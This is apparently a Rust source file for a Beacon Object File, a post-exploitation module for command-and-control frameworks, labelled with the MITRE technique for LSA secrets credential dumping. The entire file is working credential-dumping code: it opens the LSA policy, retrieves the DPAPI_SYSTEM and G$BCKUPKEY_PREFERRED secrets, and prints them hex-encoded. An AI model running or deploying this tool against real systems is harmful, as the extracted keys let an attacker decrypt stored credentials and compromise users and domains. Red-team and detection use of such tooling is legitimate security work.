//! # Get DPAPI System Keys BOF
//!
//! Retrieves DPAPI system keys from LSA secrets by querying
//! `DPAPI_SYSTEM` and `G$BCKUPKEY_PREFERRED` private data via
//! `LsaRetrievePrivateData`.
//! ## MITRE ATT&CK
//! - T1003.004 - OS Credential Dumping: LSA Secrets
//!
//! ## Arguments
//! None.

#![no_std]

use rustbof::{eprintln, println};

#[repr(C)]
struct LsaUnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct LsaObjectAttributes {
    length: u32,
    root_directory: *mut core::ffi::c_void,
    object_name: *mut core::ffi::c_void,
    attributes: u32,
    security_descriptor: *mut core::ffi::c_void,
    security_quality_of_service: *mut core::ffi::c_void,
}

const POLICY_GET_PRIVATE_INFORMATION: u32 = 0x00000004;

const STATUS_SUCCESS: i32 = 0;

type LsaHandle = *mut core::ffi::c_void;

unsafe extern "system" {
    fn LsaOpenPolicy(
        system_name: *const LsaUnicodeString,
        object_attributes: *const LsaObjectAttributes,
        desired_access: u32,
        policy_handle: *mut LsaHandle,
    ) -> i32;

    fn LsaRetrievePrivateData(
        policy_handle: LsaHandle,
        key_name: *const LsaUnicodeString,
        private_data: *mut *mut LsaUnicodeString,
    ) -> i32;

    fn LsaFreeMemory(buffer: *mut core::ffi::c_void) -> i32;

    fn LsaClose(object_handle: LsaHandle) -> i32;
}

fn make_lsa_string(wide: &mut [u16]) -> LsaUnicodeString {
    let byte_len = (wide.len().saturating_sub(1)) * 2;
    LsaUnicodeString {
        length: byte_len as u16,
        maximum_length: (wide.len() * 2) as u16,
        buffer: wide.as_mut_ptr(),
    }
}

fn hex_encode(data: &[u8]) -> alloc::string::String {
    use core::fmt::Write;
    let mut s = alloc::string::String::with_capacity(data.len() * 2);
    for &b in data {
        let _ = write!(s, "{:02x}", b);
    }
    s
}

fn retrieve_key(handle: LsaHandle, name: &str, wide_name: &mut [u16]) {
    let key_name = make_lsa_string(wide_name);
    let mut private_data: *mut LsaUnicodeString = core::ptr::null_mut();

    let status = unsafe { LsaRetrievePrivateData(handle, &key_name, &mut private_data) };

    if status != STATUS_SUCCESS {
        eprintln!(
            "LsaRetrievePrivateData('{}') failed: NTSTATUS {:#X}",
            name, status as u32
        );
        return;
    }

    if private_data.is_null() {
        eprintln!("No data returned for '{}'", name);
        return;
    }

    unsafe {
        let data = &*private_data;
        let byte_len = data.length as usize;
        if byte_len > 0 && !data.buffer.is_null() {
            let raw = core::slice::from_raw_parts(data.buffer as *const u8, byte_len);
            let hex = hex_encode(raw);
            println!("  {} ({} bytes): {}", name, byte_len, hex);
        } else {
            println!("  {}: (empty)", name);
        }
        LsaFreeMemory(private_data as *mut core::ffi::c_void);
    }
}

#[rustbof::main]
fn main() {
    println!("get_dpapi_system: Retrieving DPAPI system keys from LSA secrets");

    let attrs: LsaObjectAttributes = LsaObjectAttributes {
        length: core::mem::size_of::<LsaObjectAttributes>() as u32,
        root_directory: core::ptr::null_mut(),
        object_name: core::ptr::null_mut(),
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    let mut handle: LsaHandle = core::ptr::null_mut();
    let status = unsafe {
        LsaOpenPolicy(
            core::ptr::null(),
            &attrs,
            POLICY_GET_PRIVATE_INFORMATION,
            &mut handle,
        )
    };

    if status != STATUS_SUCCESS {
        eprintln!("LsaOpenPolicy failed: NTSTATUS {:#X}", status as u32);
        return;
    }
    println!("  LSA policy handle opened.");

    let mut dpapi_system_wide: [u16; 13] = [
        b'D' as u16,
        b'P' as u16,
        b'A' as u16,
        b'P' as u16,
        b'I' as u16,
        b'_' as u16,
        b'S' as u16,
        b'Y' as u16,
        b'S' as u16,
        b'T' as u16,
        b'E' as u16,
        b'M' as u16,
        0,
    ];
    retrieve_key(handle, "DPAPI_SYSTEM", &mut dpapi_system_wide);

    let mut bckupkey_wide: [u16; 21] = [
        b'G' as u16,
        b'$' as u16,
        b'B' as u16,
        b'C' as u16,
        b'K' as u16,
        b'U' as u16,
        b'P' as u16,
        b'K' as u16,
        b'E' as u16,
        b'Y' as u16,
        b'_' as u16,
        b'P' as u16,
        b'R' as u16,
        b'E' as u16,
        b'F' as u16,
        b'E' as u16,
        b'R' as u16,
        b'R' as u16,
        b'E' as u16,
        b'D' as u16,
        0,
    ];
    retrieve_key(handle, "G$BCKUPKEY_PREFERRED", &mut bckupkey_wide);

    unsafe {
        LsaClose(handle);
    }

    println!("SUCCESS.");
}
